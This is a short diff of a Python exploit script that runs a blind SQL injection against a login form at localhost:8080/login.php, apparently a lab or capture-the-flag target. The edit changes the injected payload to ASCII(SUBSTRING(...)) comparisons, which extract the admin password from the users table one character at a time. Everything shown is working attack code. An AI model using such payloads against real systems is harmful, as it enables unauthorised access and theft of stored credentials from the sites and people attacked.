@@ -12,7 +12,7 @@ while True:
   while True:
     payload = {
       'id':       'admin',
-      'password': f"' OR SUBSTRING((SELECT password FROM users WHERE username='admin'), {idx}, 1) <= binary '{chr(val)}'-- "
+      'password': f"' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), {idx}, 1)) = '{val}'-- "
     }
     r = requests.post('http://localhost:8080/login.php', data=payload)
 
